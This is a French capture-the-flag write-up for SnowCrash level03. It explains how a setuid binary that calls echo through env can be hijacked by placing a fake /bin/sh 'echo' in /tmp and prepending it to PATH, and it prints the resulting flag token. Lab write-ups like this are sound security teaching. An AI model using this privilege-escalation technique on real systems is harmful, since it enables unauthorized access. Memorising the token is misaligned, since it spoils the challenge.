Un fichier éxecutable est présent dans le home, et affiche ce texte :

```
level03@SnowCrash:~$ ./level03 
Exploit me
```

On peut voir que ce fichier appartient à flag03, mais aussi qu'il a le suid et sgid actif :

```
level03@SnowCrash:~$ ls -l level03 
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

le 's' placé à la position d'éxecution du propriétaire est un **setuid bit**. Cela signifie que lorsque ce fichier est executé, il s'executera avec les permissions du propriétaire du fichier, ce qui tombe bien puisque l'exécution est autorisée pour tout le monde.
Ça semble être une exploitation basique, surtout jettant un premier coup d'oeil à l'executable avec `strings`, on trouve ceci :

```
level03@SnowCrash:~$ strings level03 
/lib/ld-linux.so.2
KT{K
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo Exploit me     <------- le fail
;*2$"

etc...
```

On voit que le programme appelle echo depuis l'env, ce qui est inutile en plus de créer une vulnérabilité d'attaque d'injection de chemin (ou path injection attack). Il suffit donc de modifier l'env en ajoutant par exemple :

```
echo '/bin/sh' > /tmp/echo
chmod 755 /tmp/echo
export PATH=/tmp:$PATH
```

Il ne reste plus qu'à utiliser l'exécutable qui, au lieu de faire appel à la vraie commande echo, lancera en réalité un shell avec les permissions de l'utilisateur flag03 (puisque le suid est activé sur ce fichier), nous permettant de récupérer le flag :

```
level03@SnowCrash:~$ ./level03 
$ getflag              
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
$ 
```